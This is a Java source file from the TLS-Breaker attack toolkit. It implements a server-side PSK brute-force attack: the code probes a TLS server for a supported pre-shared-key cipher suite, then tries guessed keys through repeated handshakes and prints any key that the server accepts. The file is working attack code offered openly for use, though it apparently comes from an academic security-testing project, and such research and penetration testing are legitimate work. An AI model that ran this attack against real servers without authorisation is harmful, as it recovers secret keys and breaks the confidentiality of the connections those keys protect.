/*
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.tlsbreaker.serverpskbruteforce.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
import de.rub.nds.tlsbreaker.breakercommons.psk.PskBruteForcerAttackCommon;
import de.rub.nds.tlsbreaker.serverpskbruteforce.config.PskBruteForcerAttackServerCommandConfig;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class PskBruteForcerAttackServer
        extends PskBruteForcerAttackCommon<PskBruteForcerAttackServerCommandConfig, CipherSuite> {

    private static final Logger LOGGER = LogManager.getLogger();

    public PskBruteForcerAttackServer(
            PskBruteForcerAttackServerCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    protected CipherSuite prepareAttackState() {
        CONSOLE.info("Connecting to the Server to find a PSK cipher suite it supports...");
        return getSupportedPskCipherSuite();
    }

    @Override
    public VulnerabilityType isVulnerable() {
        CONSOLE.info("Connecting to the Server...");
        boolean supportsPsk = getSupportedPskCipherSuite() != null;
        if (supportsPsk) {
            CONSOLE.info("Server supports PSK");
            return VulnerabilityType.VULNERABILITY_POSSIBLE;
        } else {
            CONSOLE.info("Not Vulnerable - server does not support PSK");
            return VulnerabilityType.NOT_VULNERABLE;
        }
    }

    private CipherSuite getSupportedPskCipherSuite() {
        Config tlsConfig = getTlsConfig();

        String clientIdentity = config.getPskIdentity();
        LOGGER.debug("Client Identity: {}", clientIdentity);
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(tlsConfig)
                        .createWorkflowTrace(WorkflowTraceType.HELLO, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor executor =
                WorkflowExecutorFactory.createWorkflowExecutor(
                        tlsConfig.getWorkflowExecutorType(), state);
        executor.executeWorkflow();
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
            return state.getTlsContext().getSelectedCipherSuite();
        } else {
            CONSOLE.info(
                    "Did not receive a ServerHello. The Server does not seem to support any of the tested PSK cipher suites.");
            if (LOGGER.isDebugEnabled()) {
                LOGGER.debug("We tested for the following cipher suites:");
                for (CipherSuite suite : tlsConfig.getDefaultClientSupportedCipherSuites()) {
                    LOGGER.debug(suite.name());
                }
            }
            return null;
        }
    }

    @Override
    protected boolean tryPsk(byte[] pskGuess, CipherSuite suite) {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultClientSupportedCipherSuites(suite);
        tlsConfig.setDefaultSelectedCipherSuite(suite);
        tlsConfig.setDefaultPSKKey(pskGuess);
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(tlsConfig)
                        .createWorkflowTrace(WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(
                        tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        assert state.getWorkflowTrace() == trace;
        if (WorkflowTraceUtil.didReceiveMessage(ProtocolMessageType.CHANGE_CIPHER_SPEC, trace)) {
            CONSOLE.info("PSK {}", ArrayConverter.bytesToHexString(pskGuess));
            return true;
        } else {
            return false;
        }
    }
}
